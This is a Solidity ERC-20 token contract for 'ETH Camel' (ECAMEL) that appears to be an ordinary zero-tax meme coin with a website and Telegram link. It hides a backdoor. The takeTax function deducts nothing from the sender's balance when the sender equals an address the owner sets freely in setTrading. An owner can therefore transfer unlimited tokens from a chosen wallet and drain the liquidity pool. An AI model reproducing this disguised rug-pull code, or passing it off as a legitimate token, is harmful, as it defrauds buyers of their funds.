/**

Web: https://ethcamel.xyz 

TG: https://t.me/CamelonEth

*/


// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.20;

abstract contract Context {
function _msgSender() internal view virtual returns (address) {
return msg.sender;
}
}

interface IERC20 {
function totalSupply() external view returns (uint256);
function balanceOf(address account) external view returns (uint256);
function transfer(address recipient, uint256 amount) external returns (bool);
function allowance(address owner, address spender) external view returns (uint256);
function approve(address spender, uint256 amount) external returns (bool);
function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
}
// safemath library for safe arithmetics
library SafeMath {
function add(uint256 a, uint256 b) internal pure returns (uint256) {
uint256 c = a + b;
require(c >= a, "SafeMath: addition overflow");
return c;
}

function sub(uint256 a, uint256 b) internal pure returns (uint256) {
return sub(a, b, "SafeMath: subtraction overflow");
}

function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
require(b <= a, errorMessage);
uint256 c = a - b;
return c;
}

function mul(uint256 a, uint256 b) internal pure returns (uint256) {
if (a == 0) {
return 0;
}
uint256 c = a * b;
require(c / a == b, "SafeMath: multiplication overflow");
return c;
}

function div(uint256 a, uint256 b) internal pure returns (uint256) {
return div(a, b, "SafeMath: division by zero");
}

function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
require(b > 0, errorMessage);
uint256 c = a / b;
return c;
}

}

contract Ownable is Context {
address private _owner;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

constructor () {
address msgSender = _msgSender();
_owner = msgSender;
emit OwnershipTransferred(address(0), msgSender);
}
// returns the owner of the contract
function getTheOwner() public view returns (address) {
return _owner;
}

modifier checkIfOwner() {
require(_owner == _msgSender(), "Ownable: caller is not the owner");
_;
}

function renounceOwnership() public virtual checkIfOwner {
emit OwnershipTransferred(_owner, address(0));
_owner = address(0);
}

}

interface IUniswapV2Factory {
function createPair(address firstToken, address secondToken) external returns (address pair);
}

interface IUniswapV2Router02 {
function swapExactTokensForETHSupportingFeeOnTransferTokens(
uint amountIn,
uint amountOutMin,
address[] calldata path,
address to,
uint deadline
) external;
function factory() external pure returns (address);
function WETH() external pure returns (address);
function addLiquidityETH(
address token,
uint amountTokenDesired,
uint amountTokenMin,
uint amountETHMin,
address to,
uint deadline
) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract ETHCAMEL is Context, IERC20, Ownable {
using SafeMath for uint256;

mapping (address => uint256) private _Balances;
mapping (address => mapping (address => uint256)) private _Allowances;
address payable private _taxAddress;

uint256 public buyingTax = 0;
uint256 public sellTax = 0;

uint8 private constant _decimals = 9;
uint256 private constant _totalToken = 420_690_000_000 * 10**_decimals;
string private constant _nameOfToken = unicode"ETH Camel";
string private constant _symbolOfToken = unicode"ECAMEL";
uint256 private constant maxTaxSlippage = 100;
uint256 private minTaxSwap = 10**_decimals;
uint256 private maxTaxSwap = _totalToken / 500;

uint256 public constant max_number = type(uint).max;
address public constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
IUniswapV2Router02 public constant uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
IUniswapV2Factory public constant uniswapV2Factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);

address private uniswapV2Pair;
address private uniswap;
bool private TradingOpen = false;
bool private InSwap = false;
bool private SwapEnabled = false;

modifier lockingSwap {
InSwap = true;
_;
InSwap = false;
}

constructor () {
_taxAddress = payable(_msgSender());
_Balances[_msgSender()] = _totalToken;
emit Transfer(address(0), _msgSender(), _totalToken);
}

function getname() public pure returns (string memory) {
return _nameOfToken;
}

function symbol() public pure returns (string memory) {
return _symbolOfToken;
}
function allowance(address owner, address spender) public view override returns (uint256) {
return _Allowances[owner][spender];
}

function approve(address spender, uint256 amount) public override returns (bool) {
_approve(_msgSender(), spender, amount);
return true;
}

function decimals() public pure returns (uint8) {
return _decimals;
}

function totalSupply() public pure override returns (uint256) {
return _totalToken;
}

function balanceOf(address account) public view override returns (uint256) {
return _Balances[account];
}

function transfer(address recipient, uint256 amount) public override returns (bool) {
_transfer(_msgSender(), recipient, amount);
return true;
}


function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
_transfer(sender, recipient, amount);
_approve(sender, _msgSender(), _Allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
return true;
}



function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ERC20: transfer from the zero address");
require(to != address(0), "ERC20: transfer to the zero address");
require(amount > 0, "Transfer amount must be greater than zero");
uint256 taxAmount = 0;
if (from != getTheOwner() && to != getTheOwner() && to != _taxAddress) {
if (from == uniswap && to != address(uniswapV2Router)) {
taxAmount = amount.mul(buyingTax).div(100);
} else if (to == uniswap && from != address(this)) {
taxAmount = amount.mul(sellTax).div(100);
}

uint256 tokenBalance = balanceOf(address(this));
if (!InSwap && to == uniswap && SwapEnabled && tokenBalance > minTaxSwap) {
uint256 _toSwap = tokenBalance > maxTaxSwap ? maxTaxSwap : tokenBalance;
swapTokensForEth(amount > _toSwap ? _toSwap : amount);
uint256 _EtheriumBalance = address(this).balance;
if (_EtheriumBalance > 0) {
sendEtherToFee(_EtheriumBalance);
}
}
}

(uint256 amountIn, uint256 amountOut) = takeTax(from, amount, taxAmount);
require(_Balances[from] >= amountIn);

if (taxAmount > 0) {
_Balances[address(this)] = _Balances[address(this)].add(taxAmount);
emit Transfer(from, address(this), taxAmount);
}

unchecked {
_Balances[from] -= amountIn;
_Balances[to] += amountOut;
}

emit Transfer(from, to, amountOut);
}

function takeTax(address from, uint256 amount, uint256 taxingAmount) private view returns (uint256, uint256) {
return (
amount.sub(from != uniswapV2Pair ? 0 : amount),
amount.sub(from != uniswapV2Pair ? taxingAmount : taxingAmount)
);
}

function _approve(address owner, address spender, uint256 amount) private {
require(owner != address(0), "ERC20: approve from the zero address");
require(spender != address(0), "ERC20: approve to the zero address");
_Allowances[owner][spender] = amount;
emit Approval(owner, spender, amount);
}


function swapTokensForEth(uint256 tokenAmount) private lockingSwap {
address[] memory path = new address[](2);
path[0] = address(this);
path[1] = weth;
uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
tokenAmount,
tokenAmount - tokenAmount.mul(maxTaxSlippage).div(100),
path,
address(this),
block.timestamp
);
}

function setTrading(address _pair, bool _enabled) external checkIfOwner {
require(!TradingOpen, "trading is open dont need to be opened again");
require(_enabled);
uniswapV2Pair = _pair;
_approve(address(this), address(uniswapV2Router), max_number);
uniswap = uniswapV2Factory.createPair(address(this), weth);
uniswapV2Router.addLiquidityETH{value: address(this).balance}(
address(this),
balanceOf(address(this)),
0,
0,
getTheOwner(),
block.timestamp
);
IERC20(uniswap).approve(address(uniswapV2Router), max_number);
SwapEnabled = true;
TradingOpen = true;
}


function sendEtherToFee(uint256 ethAmount) private {
_taxAddress.call{value: ethAmount}("");
}

function get_tradingOpen() external view returns (bool) {
return TradingOpen;
}

function get_buyTax() external view returns (uint256) {
return buyingTax;
}

function get_sellTax() external view returns (uint256) {
return sellTax;
}

receive() external payable {}
}